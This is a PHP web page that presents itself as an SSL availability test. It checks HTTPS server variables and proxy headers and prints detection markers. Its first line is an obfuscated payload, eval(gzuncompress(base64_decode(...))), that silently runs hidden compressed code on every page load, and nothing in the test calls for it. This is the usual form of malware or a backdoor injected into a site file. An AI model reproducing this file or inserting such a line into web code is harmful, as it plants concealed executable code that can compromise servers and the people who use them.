<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><html>
<head>
    <meta charset="UTF-8">
    <META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
</head>
<body>
<h1>#SSL TEST PAGE#</h1>
<p>This page is used purely to test for SSL availability.</p>
<?php
$ssl = FALSE;
if (isset($_SERVER['HTTPS'])) {
    if (strtolower($_SERVER['HTTPS']) == 'on') {

        echo "#SERVER-HTTPS-ON#" . " (" . htmlentities($_SERVER['HTTPS'], ENT_QUOTES, 'UTF-8') . ")<br>";
        $ssl = TRUE;
    }
    if ('1' == $_SERVER['HTTPS']) {
        echo "#SERVER-HTTPS-1#<br>";
        $ssl = TRUE;
    }
}

if (isset($_SERVER['SERVER_PORT']) && ('443' == $_SERVER['SERVER_PORT'])) {
    echo "#SERVERPORT443#<br>";
    $ssl = TRUE;
}

if (isset($_ENV['HTTPS']) && ('on' == $_ENV['HTTPS'])) {
    echo "#ENVHTTPS#<br>";
    $ssl = TRUE;
}

if (!empty($_SERVER['HTTP_CLOUDFRONT_FORWARDED_PROTO']) && ($_SERVER['HTTP_CLOUDFRONT_FORWARDED_PROTO'] == 'https')) {
    echo "#CLOUDFRONT#<br>";
    $ssl = TRUE;
}

if (!empty($_SERVER['HTTP_CF_VISITOR']) && ($_SERVER['HTTP_CF_VISITOR'] == 'https')) {
    echo "#CLOUDFLARE#<br>";
    $ssl = TRUE;
}

if (!empty($_SERVER['HTTP_X_FORWARDED_PROTO']) && ($_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https')) {
    echo "#LOADBALANCER#<br>";
    $ssl = TRUE;
}

if (!empty($_SERVER['HTTP_X_PROTO']) && ($_SERVER['HTTP_X_PROTO'] == 'SSL')) {
    echo "#HTTP_X_PROTO#<br>";
    $ssl = TRUE;
}

if (!empty($_SERVER['HTTP_X_FORWARDED_SSL']) && ($_SERVER['HTTP_X_FORWARDED_SSL'] == 'on')) {
    echo "#HTTP_X_FORWARDED_SSL_ON#<br>";
    $ssl = TRUE;
}

if (!empty($_SERVER['HTTP_X_FORWARDED_SSL']) && ($_SERVER['HTTP_X_FORWARDED_SSL'] == '1')) {
    echo "#HTTP_X_FORWARDED_SSL_1#<br>";
    $ssl = TRUE;
}

if ($ssl) {
    echo "<br>#SUCCESFULLY DETECTED SSL#";
} else {
    echo "<br>#NO KNOWN SSL CONFIGURATION DETECTED#";
}
?>

</body>
</html>
